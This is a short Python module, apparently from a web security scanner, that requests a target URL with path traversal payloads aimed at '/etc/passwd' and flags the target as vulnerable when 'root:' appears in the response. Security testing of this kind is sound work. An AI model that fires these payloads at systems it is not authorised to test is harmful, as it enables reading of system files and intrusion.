import requests
from utils import save_results

def run(url: str):
    print(f"\n[TRAVERSAL] Performing path traversal test on {url}...")
    payloads = ["../../etc/passwd", "../"*5 + "etc/passwd"]
    found = []
    for p in payloads:
        try:
            r = requests.get(url + "/" + p, timeout=5)
            if "root:" in r.text:
                print(f"  ⚠ Path traversal vulnerability found: {p}")
                found.append(p)
        except:
            continue
    save_results({"target": url, "traversal_vuln": found}, "traversal")
